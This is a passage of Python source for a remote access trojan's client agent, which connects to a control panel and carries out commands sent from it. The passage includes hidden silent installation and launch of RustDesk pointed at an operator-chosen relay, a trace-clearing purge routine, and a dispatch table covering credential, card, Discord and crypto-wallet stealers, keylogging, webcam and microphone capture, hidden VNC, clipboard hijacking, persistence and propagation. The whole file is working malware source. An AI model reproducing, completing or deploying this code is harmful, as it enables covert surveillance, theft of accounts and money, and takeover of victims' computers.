    running = []
    try:
        import psutil
        for p in psutil.process_iter(["pid", "name"]):
            if (p.info.get("name") or "").lower().startswith("rustdesk"):
                running.append({"pid": p.info["pid"], "name": p.info["name"]})
    except Exception:
        pass
    cfg = _rustdesk_cfg()
    return {"installed": bool(exe), "exe": str(exe) if exe else "",
            "running": running, "config": str(cfg), "config_exists": cfg.exists(),
            "config_text": cfg.read_text(encoding="utf-8", errors="replace")[:4000]
            if cfg.exists() else ""}


def rustdesk_install(args):
    if not IS_WIN:
        raise RuntimeError("Windows-only")
    installer = str(args.get("path", "")).strip()
    if not installer or not Path(installer).is_file():
        raise RuntimeError("path to a RustDesk installer is required")
    r = subprocess.run([installer, "--silent-install"], capture_output=True,
                       text=True, timeout=300, creationflags=0x08000000)
    return {"code": r.returncode, "stdout": (r.stdout or "")[-4000:],
            "stderr": (r.stderr or "")[-4000:]}


def rustdesk_configure(args):
    if not IS_WIN:
        raise RuntimeError("Windows-only")
    relay = str(args.get("relay", "")).strip()
    key = str(args.get("key", "")).strip()
    if not relay and not key:
        raise RuntimeError("relay and/or key required")
    cfg = _rustdesk_cfg()
    cfg.parent.mkdir(parents=True, exist_ok=True)
    backup = None
    if cfg.exists():
        backup = cfg.with_suffix(".toml.bak")
        shutil.copy2(cfg, backup)
    lines = ["[options]"]
    if relay:
        lines.append(f"rendezvous_server = '{relay}'")
    lines += ["nat_type = 1", "serial = 0", ""]
    if key:
        lines += ["[options]", f"key = '{key}'", ""]
    cfg.write_text("\n".join(lines), encoding="utf-8")
    return {"config": str(cfg), "backup": str(backup) if backup else "",
            "relay": relay, "key_set": bool(key)}


def rustdesk_launch(args):
    if not IS_WIN:
        raise RuntimeError("Windows-only")
    exe = _rustdesk_exe()
    if not exe:
        raise RuntimeError("RustDesk is not installed")
    hidden = bool(args.get("hidden", True))
    si = _STARTUPINFO()
    si.cb = ctypes.sizeof(_STARTUPINFO)
    if hidden:
        si.dwFlags = 0x00000001           # STARTF_USESHOWWINDOW
        si.wShowWindow = 0                # SW_HIDE
    pi = _PROCESSINFO()
    cmd = ctypes.create_unicode_buffer(f'"{exe}"')
    okp = ctypes.windll.kernel32.CreateProcessW(
        None, cmd, None, None, False, 0x08000000, None, None,
        ctypes.byref(si), ctypes.byref(pi))
    if not okp:
        raise RuntimeError(f"CreateProcess failed ({ctypes.GetLastError()})")
    for handle in (pi.hProcess, pi.hThread):
        if handle:
            ctypes.windll.kernel32.CloseHandle(handle)
    return {"pid": pi.dwProcessId, "hidden": hidden, "exe": str(exe)}


# --------------------------------------------------------------------------
# control
# --------------------------------------------------------------------------
STATUS = {"status": "online", "note": "", "user": ""}
STOP = {"on": False}


def set_status(args):
    STATUS["status"] = str(args.get("status", "online"))[:40]
    STATUS["note"] = str(args.get("note", ""))[:200]
    event("status", status=STATUS["status"], note=STATUS["note"])
    return dict(STATUS)


def set_user_status(args):
    STATUS["user"] = str(args.get("text", ""))[:200]
    event("user_status", text=STATUS["user"])
    return {"user": STATUS["user"]}


def purge(_args):
    removed, freed = [], 0
    d = Path(tempfile.gettempdir()) / "chonga"
    if d.exists():
        for p in d.rglob("*"):
            try:
                if p.is_file():
                    freed += p.stat().st_size
            except OSError:
                pass
        shutil.rmtree(d, ignore_errors=True)
        removed.append(str(d))
    KEYLOG["buf"].clear()
    CLIPPER["hits"].clear()
    with CAM["lock"]:
        _cam_kill()
    for t in list(TUNNELS.values()):
        try:
            t["sock"].close()
        except OSError:
            pass
    TUNNELS.clear()
    return {"removed": removed, "bytes": freed, "keylog_cleared": True}


def retry(_args):
    def drop():
        time.sleep(0.4)
        try:
            SOCK.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
    threading.Thread(target=drop, daemon=True).start()
    return {"reconnecting": True}


def close_connection(_args):
    STOP["on"] = True

    def drop():
        time.sleep(0.2)
        try:
            SOCK.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
    threading.Thread(target=drop, daemon=True).start()
    return {"closed": True}


def bot_kill(_args):
    try:
        persist_remove({})
    except Exception:
        pass

    def die():
        time.sleep(0.5)
        os._exit(0)
    threading.Thread(target=die, daemon=True).start()
    return {"dying": True}


# --------------------------------------------------------------------------
# dispatch
# --------------------------------------------------------------------------
HANDLERS = {
    "ping": lambda a: {"pong": time.time()},
    "sysinfo": lambda a: sysinfo(),
    "screenshot": screenshot,
    "mouse": do_mouse,
    "key": do_key,
    "clipboard_get": clipboard_get,
    "clipboard_set": clipboard_set,
    "drives": drives,
    "listdir": listdir,
    "stat": stat,
    "mkdir": mkdir,
    "rename": rename,
    "delete": delete,
    "file_read": file_read,
    "file_write": file_write,
    "file_close": file_close,
    "processes": processes,
    "process_kill": process_kill,
    "process_start": process_start,
    "shell": shell,
    "registry": registry,
    "power": power,
    "messagebox": messagebox,
    "tts": tts,
    "audio": audio,
    "windows": windows,
    "idle": idle,
    "keylog_start": keylog_start,
    "keylog_stop": keylog_stop,
    "keylog_dump": keylog_dump,
    "chat": lambda a: chat_open(a),
    "chat_send": chat_send,
    "chat_close": chat_close,
    # extended modules
    "monitors": monitors,
    "mask": mask,
    "lift": lift,
    "mask_status": mask_status,
    "clipper_start": clipper_start,
    "clipper_stop": clipper_stop,
    "clipper_hits": clipper_hits,
    "webcam_list": webcam_list,
    "webcam_frame": webcam_frame,
    "webcam_stop": webcam_stop,
    "mic_list": mic_list,
    "mic_capture": mic_capture,
    "desktop_audio": desktop_audio,
    "play_audio": play_audio,
    "stop_audio": stop_audio,
    "hvnc_start": hvnc_start,
    "hvnc_stop": hvnc_stop,
    "hvnc_status": hvnc_status,
    "hvnc_windows": hvnc_windows,
    "hvnc_processes": hvnc_processes,
    "hvnc_start_process": hvnc_start_process,
    "hvnc_kill_process": hvnc_kill_process,
    "hvnc_frame": hvnc_frame,
    "hvnc_input": hvnc_input,
    "hvnc_clipboard": hvnc_clipboard,
    "steal_cookies": steal_cookies,
    "steal_history": steal_history,
    "steal_autofill": steal_autofill,
    "steal_passwords": steal_passwords,
    "steal_cards": steal_cards,
    "steal_downloads": steal_downloads,
    "steal_bookmarks": steal_bookmarks,
    "steal_firefox": steal_firefox,
    "steal_all": steal_all,
    "steal_discord": steal_discord,
    "steal_roblox": steal_roblox,
    "steal_wallets": steal_wallets,
    "steal_extensions": steal_extensions,
    "steal_archive": steal_archive,
    "connections": connections,
    "geo": geo,
    "startup_list": startup_list,
    "startup_add": startup_add,
    "startup_remove": startup_remove,
    "persist_status": persist_status,
    "persist_install": persist_install,
    "persist_remove": persist_remove,
    "vs_infect": vs_infect,
    "vs_clean": vs_clean,
    "proxy_open": proxy_open,
    "proxy_send": proxy_send,
    "proxy_recv": proxy_recv,
    "proxy_close": proxy_close,
    "proxy_list": proxy_list,
    "proxy_start": proxy_start,
    "proxy_stop": proxy_stop,
    "proxy_status": proxy_status,
    "plugin_load": plugin_load,
    "plugin_list": plugin_list,
    "plugin_call": plugin_call,
    "plugin_unload": plugin_unload,
    "code_run": code_run,
    "execute": execute,
    "run_command": run_command,
    "visit_website": visit_website,
    "file_hash": file_hash,
    "file_search": file_search,
    "recycle_list": recycle_list,
    "recycle_restore": recycle_restore,
    "rustdesk_status": rustdesk_status,
    "rustdesk_install": rustdesk_install,
    "rustdesk_configure": rustdesk_configure,
    "rustdesk_launch": rustdesk_launch,
    "set_status": set_status,
    "set_user_status": set_user_status,
    "purge": purge,
    "retry": retry,
    "close_connection": close_connection,
    "bot_kill": bot_kill,
}

FEATURE_MAP = {
    "screen": {"screenshot", "monitors"},
    "input": {"mouse", "key"},
    "files": {"drives", "listdir", "stat", "mkdir", "rename", "delete",
              "file_read", "file_write", "file_close", "file_hash", "file_search"},
    "processes": {"processes", "process_kill", "process_start"},
    "shell": {"shell", "execute", "run_command"},
    "registry": {"registry"},
    "clipboard": {"clipboard_get", "clipboard_set"},
    "keylog": {"keylog_start", "keylog_stop", "keylog_dump"},
    "audio": {"audio", "play_audio", "stop_audio"},
    "tts": {"tts"},
    "power": {"power"},
    "messagebox": {"messagebox"},
    "chat": {"chat", "chat_send", "chat_close"},
    "windows": {"windows", "idle", "mask", "lift"},
    "hvnc": {"hvnc_start", "hvnc_stop", "hvnc_status", "hvnc_windows",
             "hvnc_processes", "hvnc_start_process", "hvnc_kill_process",
             "hvnc_frame", "hvnc_input", "hvnc_clipboard"},
    "webcam": {"webcam_list", "webcam_frame", "webcam_stop"},
    "mic": {"mic_list", "mic_capture"},
    "desktop_audio": {"desktop_audio"},
    "stealer": {"steal_cookies", "steal_history", "steal_autofill",
                "steal_passwords", "steal_cards", "steal_downloads",
                "steal_bookmarks", "steal_firefox", "steal_discord",
                "steal_roblox", "steal_wallets", "steal_extensions",
                "steal_archive", "steal_all"},
    "recon": {"connections", "geo", "startup_list", "recycle_list",
              "recycle_restore"},
    "persistence": {"startup_add", "startup_remove", "persist_status",
                    "persist_install", "persist_remove"},
    "propagation": {"vs_infect", "vs_clean"},
    "proxy": {"proxy_open", "proxy_send", "proxy_recv", "proxy_close",
              "proxy_list", "proxy_start", "proxy_stop", "proxy_status"},
    "plugins": {"plugin_load", "plugin_list", "plugin_call", "plugin_unload",
                "code_run"},
    "rustdesk": {"rustdesk_status", "rustdesk_install", "rustdesk_configure",
                 "rustdesk_launch"},
    "clipper": {"clipper_start", "clipper_stop", "clipper_hits"},
    "control": {"set_status", "set_user_status", "purge", "retry",
                "close_connection", "bot_kill"},
}


def allowed(cmd):
    if cmd in ("ping", "sysinfo", "disconnect"):
        return True
    for feat, cmds in FEATURE_MAP.items():
        if cmd in cmds:
            return feat in FEATURES
    return False


def run_command(msg):
    rid = msg.get("id")
    cmd = msg.get("cmd", "")
    args = msg.get("args") or {}
    if not allowed(cmd):
        err(rid, f"feature disabled or unknown command: {cmd}")
        return
    if cmd == "disconnect":
        ok(rid, disconnected=True)
        try:
            SOCK.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        os._exit(0)
    fn = HANDLERS.get(cmd)
    if fn is None:
        err(rid, "unknown command")
        return
    try:
        data = fn(args)
        ok(rid, **(data or {}))
    except Exception as e:
        err(rid, f"{type(e).__name__}: {e}")


# --------------------------------------------------------------------------
# main
# --------------------------------------------------------------------------
def _connect():
    last = None
    for _ in range(10):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            return s
        except OSError as e:
            last = e
            time.sleep(1.5)
    sys.exit(f"cannot reach the panel on {HOST}:{PORT}: {last}")


def session():
    global SOCK
    SOCK = _connect()
    peer = SOCK.getpeername()[0]
    if HOST in ("127.0.0.1", "localhost", "::1") and not (
            peer in ("127.0.0.1", "::1") or peer.startswith("127.")):
        sys.exit("refusing to run: peer is not loopback")
    f = SOCK.makefile("rwb")
    hello = {"token": TOKEN, "client_id": CLIENT_ID, "info": sysinfo(),
             "features": sorted(FEATURES)}
    f.write((json.dumps(hello) + "\n").encode("utf-8"))
    f.flush()
    try:
        raw = f.readline(1024 * 1024)
    except OSError as e:
        sys.exit(f"handshake failed: {e}")
    if not raw:
        sys.exit("handshake failed: server closed the connection")
    try:
        reply = json.loads(raw)
    except json.JSONDecodeError:
        sys.exit("handshake failed: malformed reply from server")
    if not reply.get("ok"):
        sys.exit("handshake rejected: " + str(reply.get("error")))
    event("agent_ready", pid=os.getpid())
    try:
        while True:
            line = f.readline(32 * 1024 * 1024)
            if not line:
                break
            try:
                msg = json.loads(line)
            except json.JSONDecodeError:
                continue
            threading.Thread(target=run_command, args=(msg,), daemon=True).start()
    except OSError:
        pass
    finally:
        try:
            SOCK.close()
        except OSError:
            pass
        SOCK = None


def main():
    if not HOST:
        sys.exit("refusing to run: no panel host in the build config")
    # Reconnect if the panel restarts. A rejection (bad token) raises
    # SystemExit and stops the agent instead of looping.
    while True:
        if STOP["on"]:
            return
        try:
            session()
        except SystemExit:
            raise
        except OSError:
            pass
        if STOP["on"]:
            return
        time.sleep(3)


if __name__ == "__main__":
    if "--chat-window" in sys.argv:
        chat_window_main()
        sys.exit(0)
    if "--camera-worker" in sys.argv:
        camera_worker_main()
        sys.exit(0)
    if "--audio-list" in sys.argv:
        audio_list_main()
        sys.exit(0)
    if "--capture-worker" in sys.argv:
        i = sys.argv.index("--capture-worker")
        kind = sys.argv[i + 1] if len(sys.argv) > i + 1 else "mic"
        secs = sys.argv[i + 2] if len(sys.argv) > i + 2 else "5"
        capture_worker_main(kind, secs)
        sys.exit(0)
    try:
        main()
    except KeyboardInterrupt:
        pass
